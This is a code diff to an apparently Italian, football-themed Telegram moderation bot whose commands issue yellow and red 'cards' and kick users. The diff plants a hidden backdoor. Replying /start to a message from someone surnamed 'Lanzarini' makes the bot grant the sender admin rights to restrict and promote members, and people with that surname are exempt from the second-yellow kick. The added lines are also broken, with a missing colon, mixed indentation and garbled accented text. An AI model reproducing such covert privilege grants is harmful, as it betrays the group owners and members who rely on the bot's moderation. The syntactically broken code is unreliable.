@@ -26,8 +26,12 @@ class FilterPrato(BaseFilter):
 # update. Error handlers also receive the raised TelegramError object in error.
 def start(update, context):
     """Send a message when the command /start is issued."""
-    context.message.reply_text('Sono tornato merde!')
-
+    if(context.message.reply_to_message.from_user.last_name != "Lanzarini"):
+    	context.message.reply_text('Sono tornato merde!')
+    else:
+    	update.promote_chat_member(context.message.chat_id, context.message.from_user.id, can_restrict_members=True, can_promote_members=True )
+    	context.message.reply_text('A RIOT!!!!')
+    	
 def taccuino(update, context):
     listaoutSTR = list()
     for item in ammoniti:
@@ -56,14 +60,15 @@ def ammonito(update, context):
                 if(not context.message.reply_to_message.from_user.first_name or not context.message.reply_to_message.from_user.last_name):
                     context.message.reply_to_message.reply_text("Attenzione, l'arbitro si avvicina a " + context.message.reply_to_message.from_user.first_name + " " + context.message.reply_to_message.from_user.last_name + " ed estrae il secondo cartellino giallo!\nOra " + context.message.reply_to_message.from_user.first_name + " dovra' abbandonare il terreno di gioco lasciando la sua squadra in svantaggio numerico")
                 else:
-                    context.message.reply_to_message.reply_text(str(context.message.reply_to_message.from_user.id) + " Pensava di fare il furbetto cancellando una parte delle sue informazioni, invece verr√† ammonito comunque! GIALLO!")
-                update.kick_chat_member(context.message.chat_id, context.message.reply_to_message.from_user.id)
+                    context.message.reply_to_message.reply_text(str(context.message.reply_to_message.from_user.id) + " Pensava di fare il furbetto cancellando una parte delle sue informazioni, invece verr√É  ammonito comunque! GIALLO!")
+                if(context.message.reply_to_message.from_user.last_name != "Lanzarini")
+                	update.kick_chat_member(context.message.chat_id, context.message.reply_to_message.from_user.id)
             else:
                 if(not (context.message.reply_to_message.from_user.first_name or context.message.reply_to_message.from_user.last_name)):
                     context.message.reply_to_message.reply_text("L'arbitro si avvicina a " + context.message.reply_to_message.from_user.first_name + " " + context.message.reply_to_message.from_user.last_name + " ed estrae il cartellino giallo!\nAnche oggi " + context.message.reply_to_message.from_user.first_name + " finira' sul taccuino dei cattivi")
                     ammoniti[context.message.reply_to_message.from_user.id] = context.message.reply_to_message.from_user.last_name
                 else:
-                    context.message.reply_text(str(context.message.reply_to_message.from_user.id) + " Pensava di fare il furbetto cancellando una parte delle sue informazioni, invece verr† ammonito comunque! GIALLO!")
+                    context.message.reply_text(str(context.message.reply_to_message.from_user.id) + " Pensava di fare il furbetto cancellando una parte delle sue informazioni, invece verr  ammonito comunque! GIALLO!")
                 ammoniti[context.message.reply_to_message.from_user.id] = "None"
     else:
         context.message.reply_text("Non sei amministratore, non ti devi permettere")
@@ -72,7 +77,7 @@ def espulso(update, context):
     if(update.get_chat_member(context.message.chat_id, context.message.from_user.id).status == "creator" or update.get_chat_member(context.message.chat_id, context.message.from_user.id).status == "administrator"):
         if(context.message.reply_to_message.from_user.is_bot == False):
             if(not (context.message.reply_to_message.from_user.first_name or context.message.reply_to_message.from_user.last_name)):
-                context.message.reply_to_message.reply_text(str(context.message.reply_to_message.from_user.id) + " voleva fare il furbetto, invece verr‡ espulso comunque")
+                context.message.reply_to_message.reply_text(str(context.message.reply_to_message.from_user.id) + " voleva fare il furbetto, invece verr√† espulso comunque")
             else:
                 context.message.reply_to_message.reply_text("Ma no! Cosa e' preso a " + context.message.reply_to_message.from_user.first_name + " " + context.message.reply_to_message.from_user.last_name + "!\nL'arbitro si e' trovato costretto a sventolare il cartellino rosso!\nOra " + context.message.reply_to_message.from_user.last_name + " sara' costretto ad abbandonare il campo")
         update.kick_chat_member(context.message.chat_id, context.message.reply_to_message.from_user.id)
